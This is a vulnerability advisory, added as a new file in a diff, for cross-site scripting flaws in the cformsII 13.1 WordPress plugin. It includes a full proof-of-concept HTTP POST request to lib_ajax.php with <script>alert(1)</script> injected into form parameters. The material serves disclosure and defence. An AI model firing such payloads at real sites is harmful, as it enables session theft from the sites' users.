@@ -1,0 +1,59 @@
+source: http://www.securityfocus.com/bid/44587/info
+
+The cformsII plugin for WordPress is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+cformsII 13.1 is vulnerable; other versions may also be affected. 
+
+    Request:
+
+    http://www.example.com/wp-content/plugins/cforms/lib_ajax.php
+
+    POST /wp-content/plugins/cforms/lib_ajax.php HTTP/1.1
+
+    Host: www.example.com
+
+    User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:
+
+    1.9.2.10) Gecko/20100914 Firefox/3.6.10
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    Accept-Language: en-us,en;q=0.5
+
+    Accept-Encoding: gzip,deflate
+
+    Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+
+    Keep-Alive: 115
+
+    Connection: keep-alive
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Content-Length: 219
+
+    Cookie: wp-settings-1=m0%3Do%26m1%3Do%26m2%3Do%26m3%3Do%26m4%3Do%26m5%3Do
+
+    %26m6%3Do%26m7%3Do%26m8%3Do%26urlbutton%3Dnone%26editor%3Dtinymce
+
+    %26imgsize%3Dfull%26align%3Dcenter%26hidetb%3D1%26m9%3Dc%26m10%3Do
+
+    %26uploader%3D1%26m11%3Do; wp-settings-time-1=1285758765;
+
+    c o m m e n t _ a u t h o r _ 9 3 f 4 1 b a 0 b 1 6 f 3 4 6 7 6 f 8 0 2 0 5 8 e 8 2 3 8 8 f 6 = t e s t  ;
+
+    comment_author_email_93f41ba0b16f34676f802058e82388f6=rbranco_nospam
+
+    %40checkpoint.com
+
+    Pragma: no-cache
+
+    Cache-Control: no-cache
+
+    rs=<script>alert(1)</script>&rst=&rsrnd=1287506634854&rsargs[]=1$#
+
+    $<script>alert(1)</script>$#$rbranco_nospam@checkpoint.com$#$http://
+
+    www.checkpoint.com$#$<script>alert(1)</script>
